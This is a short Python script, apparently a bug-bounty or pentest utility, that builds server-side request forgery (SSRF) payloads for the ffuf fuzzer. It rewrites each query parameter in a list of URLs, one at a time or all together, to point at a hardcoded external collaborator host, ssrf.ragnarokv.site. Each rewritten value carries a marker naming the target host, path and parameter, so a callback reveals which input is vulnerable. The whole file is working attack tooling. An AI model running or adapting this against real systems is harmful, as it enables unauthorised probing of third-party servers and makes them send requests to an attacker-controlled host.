#!/usr/bin/env python3

import argparse
import urllib 
from furl import furl 

# collaborator = 'https://ssrf.ragnarokv.site/webhook.php?u='
collaborator = 'https://ssrf.ragnarokv.site/'


def process_oneparam_copy(copy, param):
    marker = copy.host + str(copy.path) + param 
    # print('Inseted marker:             '+marker)
    value = collaborator+marker
    copy.args[param] = value
    # print('New Copy:           {}'.format(copy))
    # print('\n\n\n')
    return copy 

def process_allparam_copy(copy):
    params = copy.args
    string = '/'.join(params.keys())

    marker = copy.host + str(copy.path) + string 
    # print('Inseted marker:             '+marker)
    value = collaborator+marker
    for param in params.keys():
        copy.args[param] = value
    # print('New Copy:           {}'.format(copy))
    # print('\n\n\n')
    return copy 

def process_url(url):
    global all
    f = furl(url)
    if all:
        new_furl =process_allparam_copy(f.copy())
        print(new_furl)
    else:
        params = f.args
        #params omdict1D([('one', '1'), ('two', '2')])
        for param in params.keys():
            # params.key()[1, 2, 3]

            # print('Original url:          ')
            # print(f)
            new_furl = process_oneparam_copy(f.copy(), param)
            print(new_furl)





my_parser = argparse.ArgumentParser(description='Build ssrf urls for ffuf to fuzz')

my_parser.add_argument('-f',
                       '--file',
                        required = True,
                        type=argparse.FileType('r'),
                       help='the location of input urls file')

my_parser.add_argument('-a',
                       '--all',
                       default=False,
                       action="store_true" ,
                       help=' replace all params at once ')


                    
args = my_parser.parse_args()

urls_file = args.file
all = args.all

for url in urls_file:
    process_url(url)
